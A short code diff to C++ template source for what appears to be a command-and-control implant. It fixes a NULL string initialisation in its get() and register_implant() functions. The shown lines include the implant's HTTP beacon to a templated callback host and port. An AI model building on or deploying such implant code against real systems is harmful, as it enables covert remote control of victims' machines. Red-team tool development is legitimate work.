@@ -60,7 +60,7 @@ nlohmann::json get(std::string implant_uuid) {
     //note - using scopes for each option
     // Start with the base URI from the profile
     std::wstring uri = L"[[ http_get_uri ]]";
-    std::string request_body = NULL; // NULL by default, as that's what the wininet wants
+    std::string request_body = ""; // NULL by default, as that's what the wininet wants
     std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
 
     [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
@@ -195,7 +195,7 @@ std::string register_implant() {
     };
 
     std::wstring uri = L"[[ http_get_uri ]]";
-    std::string request_body = NULL; // NULL by default, as that's what the wininet wants
+    std::string request_body = ""; //NULL; // NULL by default, as that's what the wininet wants
     //std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
 
     bool http_response_status = (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, headers, request_body, http_response_buffer));
